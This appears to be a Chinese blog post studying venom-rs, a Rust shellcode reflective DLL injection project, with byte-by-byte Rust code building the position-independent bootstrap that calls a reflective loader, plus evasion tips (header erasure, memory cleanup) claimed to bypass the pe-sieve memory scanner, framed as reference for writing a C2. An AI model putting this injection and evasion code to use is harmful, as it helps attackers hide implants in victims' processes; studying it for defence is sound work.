---
title: srdi-rs项目学习
date: '2025-06-02 21:16:34'
permalink: /post/srdirs-project-learning-z1ry7kq.html
layout: post
published: true
---



# srdi-rs项目学习

本篇文章对 [memN0ps/venom-rs: Rusty Injection - Shellcode Reflective DLL Injection (sRDI) in Rust](https://github.com/memN0ps/venom-rs) 进行分析学习，该项目完成了 rust 下 rdi 的实现，在写 c2 的时候有一定的参考意义。

## 项目分析

### 项目总体分析

项目目录如下所示，共有四个文件夹，分别为 generate_shellcode、inject、payload、reflective_loader，其中 inject 顾名思义是注入模块，是作者为了方便测试生成的 shellcode 所写的，这里不多做分析，payload 模块也就是要执行的功能模块，作者在这里写了弹窗功能，也不多做分析。

![image](https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250602212116-8e3h6og.png)

### reflective_loader

该部分实现了一个名为 `loader` ​的导出函数，用于反射加载 payload，和常规的 rdi 一样，其流程如下图所示：

![image](https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250602213922-ib32yct.png)

在这里不多解释流程，但是在最后我们会讨论一些优化的点。

### generate_shellcode

generate_shellcode 这一部分是该项目的核心所在，而该部分的核心就是 `Bootstrap` ​的构造，下面对 `Bootstrap` ​的构造进行详细分析。

首先 shellcode 需要找到自身在内存中的位置，通过 `call 0x00`​ 的方式，将下一条指令的位置压入栈中，进而 `pop rcx;mov r8, rcx`​,将位置保存到 rcx 和 r8 中。

```rust
    //
    // Step 1) Save the current location in memory for calculating addresses.
    //

    // call 0x00 (This will push the address of the next function to the stack)
    bootstrap.push(0xe8);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);

    // pop rcx - This will pop the value we saved on the stack into rcx to capture our current location in memory
    bootstrap.push(0x59);

    // mov r8, rcx - We copy the value of rcx into r8 before we start modifying RCX
    bootstrap.push(0x49);
    bootstrap.push(0x89);
    bootstrap.push(0xc8);
```

紧接着，对齐栈指针并且为函数调用开辟影子空间。`push rsi;mov rsi, rsp;and rsp, 0x0FFFFFFFFFFFFFFF0`​，先备份 rsi 和 rsp，然后将 rsp 按照 16 字节对齐（windows 调用约束规定），`sub rsp, 0x30`​ ​开辟影子空间，因为 `loader`​ ​函数共有六个参数，所以要预留 `6 × 8 = 48`​ ​字节空间，即使前四个参数通过寄存器传参这里也需要预留空间。

```rust
    // Step 2) Align the stack and create shadow space
    // push rsi - save original value
    bootstrap.push(0x56);

    // mov rsi, rsp - store our current stack pointer for later
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xe6);

    // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xe4);
    bootstrap.push(0xf0);

    // sub rsp, 0x30 (48 bytes) - create shadow space on the stack, which is required for x64. A minimum of 32 bytes for rcx, rdx, r8, r9. Then other params on stack
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xec);
    bootstrap.push(6 * 8); //6 args that are 8 bytes each
```

然后我们开始参数传递，`loader` ​函数的签名为：`pub unsafe extern "system" fn loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)`​，

首先是第 5 个参数，是 `_shellcode_bin`​，其实也就是 shellcode 的其实位置，将之前 rcx 中的值减去 5 即可，这个参数在 `loader`​ ​函数中并没有使用，但是我们可以自己加上清理内存的步骤。然后是第六个参数，其实就是一个 flag 值，用来判断是执行 `DllMain`​ ​还是其他导出函数。

```rust
    // Step 3) Setup reflective loader parameters: Place the last 5th and 6th args on the stack since, rcx, rdx, r8, r9 are already in use for our first 4 args.
    // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) - (32 bytes) Push in arg 5
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0x4C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg
    // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) - modify the 5th arg to get the real shellcode base
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0x6C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg

    bootstrap.push(5); // minus 5 bytes because call 0x00 is 5 bytes to get the allocate memory from VirtualAllocEx from injector
    // mov dword ptr [rsp + 0x28], <flags> - (40 bytes) Push arg 6 just above shadow space
    bootstrap.push(0xC7);
    bootstrap.push(0x44);
    bootstrap.push(0x24);
    bootstrap.push(5 * 8); // 6th arg
    bootstrap.append(&mut flags_value.to_le_bytes().to_vec().clone());
```

然后是第四个参数 `user_data_len`​，这是传递给 payload 的参数的长度，第三个参数 `user_data`​，该参数的位置在 srdi 的最后，还记得我们前面 r8 中已经存了 `shellcode的位置+5`​，所以我们再加上剩下的 bootstrap 以及 loader、payload 就找到 userdata 了，即 `add r8,(BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len() + payload_bytes.len();`​

然后是第二个参数`function_hash`​，要执行的函数的hash，直接mov就行了。第一个参数`payload_dll`​，payload的位置，`add rcx, (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len()`​，道理和前面`user_data`​一样，不再多讲。

```rust
    // Step 4) Setup reflective loader parameters: Place the 1st, 2nd, 3rd and 4th args in rcx, rdx, r8, r9

    // mov r9, <parameter_length> - copy the 4th parameter, which is the length of the user data into r9
    bootstrap.push(0x41);
    bootstrap.push(0xb9);
    let parameter_length = parameter_value.len() as u32; // This must u32 or it breaks assembly
    bootstrap.append(&mut parameter_length.to_le_bytes().to_vec().clone());

    // add r8, <parameter_offset> + <payload_length> - copy the 3rd parameter, which is address of the user function into r8 after calculation
    bootstrap.push(0x49);
    bootstrap.push(0x81);
    bootstrap.push(0xc0); // We minus 5 because of the call 0x00 instruction
    let parameter_offset =  (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len() as u32 + payload_bytes.len() as u32;
    bootstrap.append(&mut parameter_offset.to_le_bytes().to_vec().clone());

    // mov edx, <prameter_hash> - copy the 2nd parameter, which is the hash of the user function into edx
    bootstrap.push(0xba);
    bootstrap.append(&mut function_hash.to_le_bytes().to_vec().clone());

    // add rcx, <payload_offset> - copy the 1st parameter, which is the address of the user dll into rcx after calculation
    bootstrap.push(0x48);
    bootstrap.push(0x81);
    bootstrap.push(0xc1); // We minus 5 because of the call 0x00 instruction
    let payload_offset = (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_bytes.len() as u32; // This must u32 or it breaks assembly
    bootstrap.append(&mut payload_offset.to_le_bytes().to_vec().clone());
```

接下来就是`call <loader_offset>`​，同样的按照上面的方法计算出loader函数和当前位置偏移即可偏移，最后恢复寄存器的值，`ret`​即可。

End Bootstrap之后继续构造shellcode，后面分别添加上loader、payload、user_data即可。

```rust
    // Step 5) Call reflective loader function

    // call <loader_offset> - call the reflective loader address after calculation
    bootstrap.push(0xe8);
    // This must u32 or it breaks assembly
    let loader_address = (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4 as u32) + loader_offset as u32;    
    bootstrap.append(&mut loader_address.to_le_bytes().to_vec().clone());

    // Step 6) Reset the stack to how it was and return to the caller

    // mov rsp, rsi - Reset our original stack pointer
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xf4);

    // pop rsi - Put things back where we left them
    bootstrap.push(0x5e);

    // ret - return to caller and resume execution flow (avoids crashing process)
    bootstrap.push(0xc3);

    // End Bootstrap

 	let mut shellcode: Vec<u8> = Vec::new();

    // Bootstrap shellcode populated with the correct offsets and values
    shellcode.append(&mut bootstrap);

    // Reflective Loader (RDI)
    shellcode.append(loader_bytes);

    // Payload DLL (Existing DLL)
    shellcode.append(payload_bytes);

    // Parameter Value (User-Data)
    shellcode.append(&mut parameter_value.as_bytes().to_vec());
```

x64dbg下看bootstrap：

![](https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/1719661787005-d85880a1-0a74-474e-8fa1-e5a54098c662.png)

最后整体布局如下：

![image](https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250603140356-6svfdxx.png)

## 优化的点

下面讨论一些优化的点：

1. 在将payload复制的时候，文件头可以不用复制，擦除文件头
2. 修改内存段属性，注意内存属性的分配
3. 我们在`loader`​函数中传参，传的`_shellcode_bin`​参数并没有使用，可以利用这个参数将旧内存进行清理，可以在loader中清理BootStrap的，然后在新内存空间的payload中清理shellcode剩下的内存，或者直接在payload中清理整个shellcode

经过优化可达到bypass pe-sive的效果：

![82216cb6e7801822d61bdd009518ed5a](https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/82216cb6e7801822d61bdd009518ed5a-20250603142108-w1aaxas.png)

‍
